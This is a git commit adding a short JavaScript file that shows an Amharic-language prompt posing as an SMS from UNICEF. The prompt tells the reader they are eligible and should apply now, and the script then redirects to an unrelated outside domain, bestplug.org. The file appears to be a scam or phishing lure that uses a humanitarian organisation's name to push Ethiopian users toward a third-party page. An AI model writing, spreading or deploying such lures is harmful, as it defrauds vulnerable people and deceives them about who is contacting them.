e6ea4dd767477811e4b0a230386b151e18ca746c
vibeblog <enom02567@gmail.com>
2025-04-05 07:30:24 +0100

    Create unicef-active-ethio.js

---
+++ unicef-active-ethio.js
@@ -0,0 +1,5 @@
+var password = 'አሁኑኑ ያመልክቱ'
+password=prompt('SMS: እንኳን ደስ አለህ፣ በዩኒሴፍ ብቁ ነህ፣ እሺን ተጫን አሁን ማመልከቻ አስገባ ','አሁኑኑ ያመልክቱ');
+if (password != 'አሁኑኑ ያመልክቱ') {
+location.href='https://bestplug.org/unicef-ethio';
+}
